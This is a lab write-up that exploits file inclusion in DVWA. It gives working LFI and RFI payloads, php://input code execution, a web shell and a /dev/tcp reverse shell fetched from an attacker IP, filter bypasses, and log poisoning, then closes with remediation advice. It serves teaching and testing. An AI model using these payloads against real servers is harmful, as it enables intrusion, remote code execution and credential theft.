# Lab Write-Up: File Inclusion (LFI / RFI)
**Date:** 2026-09-03  
**Author:** Adinath Dubile  
**Lab Environment:** DVWA (Damn Vulnerable Web Application)  
**Difficulty Levels Tested:** Low | Medium | High  
**Category:** File Inclusion  
**OWASP Top 10:** A03:2021 – Injection  

---

## 1. Introduction

File Inclusion vulnerabilities occur when a web application dynamically includes files based on user-supplied input without proper validation. There are two variants:

- **Local File Inclusion (LFI):** Include files already present on the server (e.g., `/etc/passwd`)
- **Remote File Inclusion (RFI):** Include files hosted on an attacker-controlled server (can lead to RCE)

**Goal of this lab:** Use LFI to read sensitive system files and use RFI to execute a PHP web shell on the DVWA server.

---

## 2. Environment Setup

| Component        | Details                                            |
|------------------|----------------------------------------------------|
| **Target App**   | DVWA – File Inclusion Module                       |
| **Attacker OS**  | Kali Linux                                         |
| **Tools Used**   | Browser, Burp Suite, Python HTTP Server            |
| **Network**      | Local lab (NAT/Host-Only)                          |
| **PHP Setting**  | `allow_url_fopen=On`, `allow_url_include=On`       |

**Enable RFI in PHP (if needed):**
```bash
# In php.ini
allow_url_fopen = On
allow_url_include = On
```

---

## 3. Vulnerability Overview

### What is File Inclusion?

**Vulnerable Code (PHP):**
```php
$file = $_GET['page'];
include($file);
```

The `page` parameter is used directly in `include()` with no validation. An attacker can supply:
- A local path: `../../../../etc/passwd`
- A remote URL: `http://attacker.com/shell.php`
- A PHP wrapper: `php://input`, `php://filter`

---

## 4. Exploitation

### 4.1 Low Security Level

**Setup:** Navigate to DVWA → File Inclusion. Set security to **Low**.

**Default URL:**
```
http://localhost/dvwa/vulnerabilities/fi/?page=include.php
```

#### Step 1 – Local File Inclusion (Path Traversal)

**Payload – Read /etc/passwd:**
```
http://localhost/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
```

**Output:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

✅ LFI confirmed.

**Read DVWA Config:**
```
?page=../../config/config.inc.php
```

**Output:**
```php
$_DVWA['db_password'] = 'p@ssw0rd';
```

**Read Apache Logs (Log Poisoning):**
```
?page=../../../../var/log/apache2/access.log
```

#### Step 2 – PHP Wrappers for Code Execution

**php://filter (read source code):**
```
?page=php://filter/convert.base64-encode/resource=../../config/config.inc.php
```

Output is Base64-encoded PHP source — decode with:
```bash
echo "BASE64_OUTPUT" | base64 -d
```

**php://input (execute arbitrary PHP):**

Using Burp Suite, send a POST request with PHP code in the body:

**Request:**
```http
POST /dvwa/vulnerabilities/fi/?page=php://input&cmd=id HTTP/1.1
Host: localhost
Cookie: PHPSESSID=abc123; security=low
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

<?php echo shell_exec($_GET['cmd']); ?>
```

**URL:**
```
?page=php://input&cmd=id
```

**Output:** `uid=33(www-data) gid=33(www-data)`

#### Step 3 – Remote File Inclusion (RFI)

Create a PHP shell on Kali (`shell.php`):
```php
<?php echo shell_exec($_GET['cmd']); ?>
```

Host it:
```bash
python3 -m http.server 8080
```

**Include the remote shell:**
```
?page=http://192.168.x.x:8080/shell.php&cmd=id
```

**Output:** `uid=33(www-data) gid=33(www-data)` ✅

#### Step 4 – Upgrade to Reverse Shell via RFI

Create `revshell.php` on Kali:
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.x.x/4444 0>&1'");
?>
```

Listener:
```bash
nc -lvnp 4444
```

**Include:**
```
?page=http://192.168.x.x:8080/revshell.php
```

---

### 4.2 Medium Security Level

**Setup:** Set security to **Medium**.

**Observation:** Path traversal sequences `../` and `..//` are stripped. Absolute paths and PHP wrappers may still work.

#### Step 1 – Absolute Path Bypass

```
?page=/etc/passwd
```

**Output:** Contents of `/etc/passwd` ✅

#### Step 2 – php://filter Still Works

```
?page=php://filter/read=convert.base64-encode/resource=/etc/passwd
```

**Output:** Base64-encoded `/etc/passwd`

#### Step 3 – RFI with Uppercase Scheme Bypass

The filter blocks `http://` and `https://` but not mixed case:

```
?page=HTTP://192.168.x.x:8080/shell.php&cmd=id
```

or

```
?page=hTTp://192.168.x.x:8080/shell.php&cmd=id
```

**Output:** `www-data` ✅

---

### 4.3 High Security Level

**Setup:** Set security to **High**.

**Observation:** Only files whose names start with `file` are accepted.

**Filter logic (approximate):**
```php
if (!fnmatch("file*", $file) && $file != "include.php") {
    echo "ERROR: File not found!";
    return;
}
```

#### Step 1 – file:// Wrapper for LFI

The `file://` URI scheme is allowed since the filename starts with `file`:

```
?page=file:///etc/passwd
```

**Output:** `/etc/passwd` contents ✅

#### Step 2 – Read Any Local File

```
?page=file:///var/www/html/dvwa/config/config.inc.php
```

**Output:** Database credentials ✅

#### Step 3 – RFI is Blocked

Remote inclusion does not work at High level since `file://` only references local files.

**Workaround:** Combine with file upload — upload a PHP shell via the file upload module, then include it:
```
?page=file:///var/www/html/dvwa/hackable/uploads/shell.php&cmd=id
```

---

## 5. Log Poisoning Attack (LFI → RCE)

A powerful LFI-to-RCE technique using Apache access logs:

#### Step 1 – Poison the Log

Send a request where the User-Agent contains PHP code:
```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://localhost/dvwa/
```

The PHP code is now written inside `/var/log/apache2/access.log`.

#### Step 2 – Execute via LFI

```
?page=../../../../var/log/apache2/access.log&cmd=id
```

**Output:** `uid=33(www-data)` — RCE achieved via log poisoning! ✅

---

## 6. Findings Summary

| Security Level | LFI | RFI  | PHP Wrapper | Bypass Method            |
|----------------|-----|------|-------------|--------------------------|
| Low            | ✅  | ✅   | ✅          | None needed              |
| Medium         | ✅  | ✅   | ✅          | Absolute path / uppercase|
| High           | ✅  | ❌   | ✅ (file://)| `file://` URI scheme     |

---

## 7. Impact Assessment

| Category       | Rating   |
|----------------|----------|
| **Severity**   | Critical |
| **CVSS Score** | 9.8      |
| **CIA Impact** | Confidentiality: High, Integrity: High, Availability: High |

**Business Impact:**
- Read of arbitrary sensitive files (`/etc/passwd`, config files, SSH keys)
- Full RCE via RFI or log poisoning
- Database credential exposure
- Full server compromise

---

## 8. Remediation Recommendations

| Fix                           | Description                                                      |
|-------------------------------|------------------------------------------------------------------|
| **Whitelist Allowed Files**   | Only allow specific known filenames (not user-controlled)        |
| **Avoid Dynamic Include**     | Don't use `include($userInput)` — map keys to file paths instead |
| **Disable allow_url_include** | Set `allow_url_include=Off` in php.ini                          |
| **Input Validation**          | Reject `../`, `./`, `//`, and URI schemes in filenames          |
| **realpath() Check**          | Ensure the resolved path is within the expected directory        |
| **Disable Dangerous Wrappers**| Use `open_basedir` to restrict filesystem access                |

**Secure Code Fix (PHP):**
```php
// Vulnerable
include($_GET['page']);

// Secure – whitelist approach
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'] ?? 'home';
if (!in_array($page, $allowed)) {
    die('Invalid page');
}
include('pages/' . $page . '.php');
```

---

## 9. References

- [OWASP File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [PortSwigger – Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [DVWA File Inclusion Walkthrough – ch3ngo](https://ch3ngo.github.io/posts/file-inclusion_dvwa_walkthrough/)
- [DVWA File Inclusion – dev-angelist](https://dev-angelist.gitbook.io/writeups-and-walkthroughs/dvwa/file-inclusion)
- [PayloadAllTheThings – LFI/RFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

---

## 10. Proof of Concept (PoC) Summary

```
Target:    DVWA – File Inclusion Module
LFI:       ?page=../../../../etc/passwd → /etc/passwd dumped
RFI:       ?page=http://ATTACKER:8080/shell.php&cmd=id → www-data
Wrapper:   ?page=php://input → Arbitrary PHP execution
Severity:  CRITICAL (CVSS 9.8)
```

---

*Write-up created for portfolio/educational purposes only. All testing performed in an isolated lab environment.*
